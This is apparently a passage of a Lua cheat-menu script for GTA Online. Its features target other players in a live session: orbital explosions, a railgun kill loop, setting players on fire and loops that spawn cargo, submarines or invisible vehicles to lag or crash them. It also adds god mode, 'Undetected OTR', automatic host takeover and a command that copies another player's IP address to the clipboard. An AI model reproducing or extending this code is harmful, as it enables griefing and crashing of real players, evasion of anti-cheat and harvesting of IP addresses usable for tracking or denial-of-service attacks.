			audio.play_sound_from_entity(-1, "DLC_XM_Explosions_Orbital_Cannon", pped, "MP_LOBBY_SOUNDS", true, 99999990, false)
			audio.play_sound_from_entity(-1, "DLC_XM_Explosions_Orbital_Cannon", pped, 0, true, 0, false)
			audio.play_sound_from_coord(-1, "BOATS_PLANES_HELIS_BOOM", v3(-910000.00,-10000.0,-19000.00), "MP_LOBBY_SOUNDS", true, 999999, false)
			audio.play_sound_from_entity(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", pped, "MP_LOBBY_SOUNDS", true, 99999990, false)
			audio.play_sound_from_entity(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", pped, 0, true, 0, false)
			audio.play_sound_from_entity(-1, "DLC_XM_Explosions_Orbital_Cannon", pped, myped, true, 0, false)
			audio.play_sound_from_entity(-1, "DLC_XM_Explosions_Orbital_Cannon", pped, 0, true, 0, false)
			graphics.set_next_ptfx_asset("scr_xm_orbital")
			while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
				graphics.request_named_ptfx_asset("scr_xm_orbital")
				system.wait(0)
			end
			gameplay.set_override_weather(3)
			gameplay.clear_cloud_hat()
			fire.add_explosion(pos, 59, false, true, 1.5, myped)
			fire.add_explosion(pos + offset, 60, true, false, 1.8, myped)
			fire.add_explosion(pos + offset, 62, true, false, 2.0, myped)
			fire.add_explosion(pos + v3(100.0,100.0,7000.00), 50, true, false, 1.0, myped)
			fire.add_explosion(pos, 50, true, false, 1.0, myped)
			fire.add_explosion(pos, 50, true, false, 1.0, myped)
			graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 100.000, false, false, true)
			--  audio.play_sound_from_coord(-1, "BOATS_PLANES_HELIS_BOOM", pos + v3(0.0,0.0,20000), "MP_LOBBY_SOUNDS", true, 0, false)
			audio.play_sound_from_entity(-1, "DLC_XM_Explosions_Orbital_Cannon", pped, "o", true, 0, false)
			audio.play_sound(-1, "DLC_XM_Explosions_Orbital_Cannon", 0, true, 0,false)
			audio.play_sound(-1, "DLC_XM_Explosions_Orbital_Cannon", 0, true, 999999999, false)
			audio.play_sound(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", 0, true, 0, false)
			audio.play_sound_from_entity(script.get_global_i(1694982), "DLC_XM_Explosions_Orbital_Cannon", pped,  0,  true, 999999999, false)
			audio.play_sound_from_entity(-1, "MP_Impact", pped, 0, true, 0, false)
			audio.play_sound(-1, "MP_Impact", 0, true, 0, false)
			graphics.set_next_ptfx_asset("scr_xm_orbital")
			while not graphics.has_named_ptfx_asset_loaded("scr_xm_orbital") do
				graphics.request_named_ptfx_asset("scr_xm_orbital")
				system.wait(0)
			end
			graphics.start_networked_ptfx_non_looped_at_coord("scr_xm_orbital_blast", pos, v3(0, 0, 0), 10.000, false, false, true)
		end
	end
	PlayerArray()
end)

Playerz = {}
function PlayerArray()
	Playerz = {}
	for pid = 0, 31 do
		if player.is_player_valid(pid) then 
			table.insert(Playerz, player.get_player_name(pid))
		end
	end
	orbital:set_str_data(Playerz)
	--return Playerz
end
PlayerArray()

event.add_event_listener("player_join", function ()
	Playerz = {}
	for pid = 0, 31 do
		if player.is_player_valid(pid) then 
			table.insert(Playerz, player.get_player_name(pid))
		end
	end
	orbital:set_str_data(Playerz)
	--return Playerz
end)

event.add_event_listener("player_leave", function ()
	Playerz = {}
	for pid = 0, 31 do
		if player.is_player_valid(pid) then 
			table.insert(Playerz, player.get_player_name(pid))
		end
	end
	orbital:set_str_data(Playerz)
	--return Playerz
end)

local optroll = menu.add_player_feature("Opressor Troll", "toggle", popt.trolls, function(feat, pid)
	menu.create_thread(cartroll, {feat = feat, pid = pid})
end)
optroll.threaded=true

menu.add_player_feature("Turn Vehicle Engine Off", "action", popt.trolls, function(playerfeat, pid)
    local player_veh = ped.get_vehicle_ped_is_using(player.get_player_ped(pid))
    if (player.is_player_in_any_vehicle(pid)) then
        menu.notify("Turned the engine in " .. player.get_player_name(pid) .. "'s " .. vehicle.get_vehicle_model(player_veh) .. " off.", "", 10, 2)
        vehicle.set_vehicle_engine_on(player_veh, false, true, true)
		system.wait(6000)
		vehicle.set_vehicle_engine_on(player_veh, true, true, true)
        --set_vehicle_engine_on(Vehicle veh, bool toggle, bool instant, bool noAutoTurnOn)
        --ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
    else
        menu.notify(player.get_player_name(pid) .. " is not in a vehicle", "", 10, 2)
    end
end)

menu.add_player_feature("Ragdoll Player", "action", popt.trolls, function(playerfeat, pid)
    local pos_start = player.get_player_coords(pid)
    local pos_end = player.get_player_coords(pid)
    pos_start.x = pos_start.x + 2
    pos_end.z = pos_end.z - 1
    pos_end.x = pos_end.x + 1
    gameplay.shoot_single_bullet_between_coords(pos_start, pos_end, 0, 0xAF3696A1, pid, false, false, 1)
end)

menu.add_player_feature("Haunting", "action", popt.trolls, function(feat, pid)
	local pos = entity.get_entity_coords(player.get_player_ped(pid))
	local v2 = v2(pos.x + 5, pos.y)
	scriptdraw.draw_sprite(4248792428, v2, 5.0, pos.z, 414116734)
end)
		
local cargo = menu.add_player_feature("Lag with Cargos", "toggle", popt.loops, function(feat, pid)            
	menu.create_thread(cargos, {feat = feat, pid = pid})
end)
cargo.threaded=true

local subb = menu.add_player_feature("Lag with Subs", "toggle", popt.loops, function(feat, pid)            
	menu.create_thread(subs, {feat = feat, pid = pid})
end)


local invis = menu.add_player_feature("Lag with invisible veh", "toggle", popt.loops, function(feat, pid)
	menu.create_thread(invis, {feat = feat, pid = pid})
end)


menu.add_player_feature("Crazy Rain", "toggle", popt.loops, function(feat, pid)
    menu.notify("Raining stuff on " .. player.get_player_name(pid), "Rain", 6, 6)
	streaming.request_model(gameplay.get_hash_key("prop_elecbox_11"))
	streaming.request_model(gameplay.get_hash_key("prop_ld_int_safe_01"))
	streaming.request_model(gameplay.get_hash_key("prop_devin_box_dummy_01"))
	streaming.request_model(gameplay.get_hash_key("ch_prop_ch_diamond_xmastree"))
	streaming.request_model(gameplay.get_hash_key("bkr_prop_clubhouse_jukebox_01a"))
	streaming.request_model(0x15F27762)
	streaming.request_model(0x4FAF0D70)
	streaming.request_model(0x810369E2)
		
	system.wait(6000)
	menu.create_thread(crazyRain, {feat = feat, pid = pid})
end)

local rgun = menu.add_player_feature("Railgun kill loop", "toggle", popt.loops, function(feat, pid)
    menu.create_thread(rgun, {feat = feat, pid = pid})
end)

menu.add_player_feature("Burn The Target", "action", popt.attach, function(playerfeat, pid)

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    attach_object1132 = object.create_object(-1065766299, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Conehead", "action", popt.attach, function(playerfeat, pid)

    local playerped3 = player.get_player_ped(pid)    
    local pos = v3()
    pos.z = pos.z + 0.50
    attach_object1132 = object.create_object(-1059647297, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Trashman", "action", popt.attach, function(playerfeat, pid)
    

    local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1132 = object.create_object(1143474856, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)

    local pos1 = player.get_player_coords(pid)
    pos1.z = pos1.z + 0.10     
    local cageobjecthash = gameplay.get_hash_key("prop_ld_rub_binbag_01") 
    local cageobject = object.create_object(cageobjecthash, pos1, true, false)
end)


menu.add_player_feature("Cactus Jack", "action", popt.attach, function(playerfeat, pid)
	local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z -0.10
    attach_object1132 = object.create_object(-194496699, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Hyrdrant Man", "action", popt.attach, function(playerfeat, pid)
	local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z + 0.10
    attach_object1132 = object.create_object(200846641, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

menu.add_player_feature("Gas Pump Man", "action", popt.attach, function(playerfeat, pid)
	local playerped3 = player.get_player_ped(pid)
    local pos = v3()
    pos.z = pos.z - 0.50
    attach_object1132 = object.create_object(-2007231801, pos, true, false)
    entity.attach_entity_to_entity(attach_object1132, playerped3, 0, pos, pos, true, true, false, 0, false)
end)

local safe = menu.add_player_feature("Safe Space(anti-crash-cam)", "toggle", 0, function(feat)
    location = player.get_player_coords(player.player_id()) --save location
    menu.notify("Here is safe space!", "", 1, 190)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(-75, -818, 326)) --mazebank
    system.yield(10)
    while feat.on do
      entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(-8292.664, -4596.8257, 14358.0))--safe space
      system.yield(1000)
    end
    if feat.on == false then
      menu.notify("Wait a sec", "", 2, 190)
    end
    system.yield(10)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), location)
end)
safe.threaded=true

local otr = menu.add_feature("Undetected OTR", "toggle", opt.opption, function(feat)
    if feat.on then
		ped.set_ped_max_health(pedLocals,  0)
	else
		ped.set_ped_max_health(pedLocals, 328)
		ped.set_ped_health(pedLocals, 328)
	end
	return HANDLER_POP
end)
otr.threaded=true

local health = menu.add_feature("Health Mod god mode", "toggle", opt.opption, function(feat)
    if feat.on then
        ped.set_ped_max_health(pedLocals, 1000000)
		ped.set_ped_health(pedLocals,  1000000)
	else
		ped.set_ped_max_health(pedLocals, 328)
		ped.set_ped_health(pedLocals, 328)
	end
    return HANDLER_POP
end)
health.threaded=true

local fire = menu.add_feature("Fire Ammo", "toggle", opt.wopption, function(feat)
	if feat.on then
		weapon.give_weapon_component_to_ped(pedLocals, 0xA914799, 0xEC0F617)
        pped = player.get_player_ped(player.player_id())
		return HANDLER_CONTINUE
    else
		weapon.give_weapon_component_to_ped(pedLocals, 0xA914799, 0x89EBDAA7)
        return HANDLER_CONTINUE
	end
    return HANDLER_POP
end)
fire.threaded=true

local quick = menu.add_feature("Quick Explosives", "toggle", opt.wopption, function(feat)
	if feat.on then
        pped = player.get_player_ped(player.player_id())
		if player.get_player_vehicle(pped) == 143113 then
			system.wait(10)
		else
			if ped.is_ped_shooting(pped) then
				if ped.get_current_ped_weapon(pped) == 2726580491 then
					weapon.remove_weapon_from_ped(pped, 2726580491)
					weapon.give_delayed_weapon_to_ped(pped, 2726580491, 0, 1)
				end
				system.wait(1)
				if ped.get_current_ped_weapon(pped) == 1672152130 then
					weapon.remove_weapon_from_ped(pped, 1672152130)
					weapon.give_delayed_weapon_to_ped(pped, 1672152130, 0, 1)
				end
			end
		end
		return HANDLER_CONTINUE
    else
        return HANDLER_CONTINUE
	end
    return HANDLER_POP
end)
quick.threaded=true

menu.add_feature("Teleport Forward", "action", opt.util, function()
	local pos = player.get_player_coords(blamed)
	entity.set_entity_coords_no_offset(pedLocals, v3(pos.x + 10, pos.y + 3, pos.z))
end)

fps = menu.add_feature("FPS Crash Protections", "toggle", opt.sopption, function(feat)
	menu.create_thread(fpsCrashCheck, feat.on)
end)

fps.on = true

host = menu.add_feature("Auto Take Host", "toggle", opt.sopption, function(feat)
	menu.create_thread(autoHost, {feat = feat})
end)

host.on= true

function dec2ip(decip)
local div, quote, ip;
for i = 3, 0, -1 do
	div = 2 ^ (i * 8)
	quote, decip = math.floor(decip / div), math.fmod(decip, div)
	if nil == ip then
		ip = quote
		else ip = ip .. "." .. quote
	end
end
return ip
end

menu.add_player_feature("copy ip to clipboard", "action", 0, function(feat, pid)
local player_ip = dec2ip(player.get_player_ip(pid)) utils.to_clipboard(""..player_ip.."")
end)

